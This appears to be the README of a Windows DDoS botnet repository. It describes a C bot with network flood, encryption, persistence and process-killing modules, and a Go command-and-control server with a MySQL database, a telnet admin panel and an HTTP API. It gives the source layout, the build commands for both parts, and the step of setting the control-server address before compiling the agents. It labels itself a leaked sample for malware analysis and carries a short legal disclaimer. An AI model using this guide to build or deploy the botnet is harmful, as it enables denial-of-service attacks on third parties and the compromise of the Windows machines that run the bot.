# Windows

**Windows** DDoS bot (C) with ICMP/TCP/UDP floods, ChaCha20/TEA crypto, persistence and killer modules; **Go CNC** with MySQL, telnet admin UI, and HTTP API.

## Layout

```
Windows/
├── bot/           # main.c, attacks_*.c, flood.c, proto.c, startup.c, killer.c
│   └── crypto/    # chacha20, teax, fasthash
├── cnc/           # main.go, admin.go, database.go, attack.go, api.go, bot.go
├── tools/         # firewall.c, howbuild.txt
├── build.sh
└── install.txt    # MySQL schema + Ubuntu deps for CNC host
```

## CNC setup (summary)

See `install.txt` for full steps:

- Go 1.24+, MariaDB/MySQL
- Schema: `users`, `history` tables
- `go mod init` + `github.com/go-sql-driver/mysql`

```bash
cd cnc
go build
```

## Bot build

```bash
cd bot
./build.sh        # or mingw-w64 per install.txt
```

Edit CNC address in `proto.c` / headers before compiling agents.

## Notes

`install.txt` states educational/leak context—treat as malware analysis reference.

## Disclaimer

Do not deploy bots on third-party Windows hosts. Illegal to use for DoS.
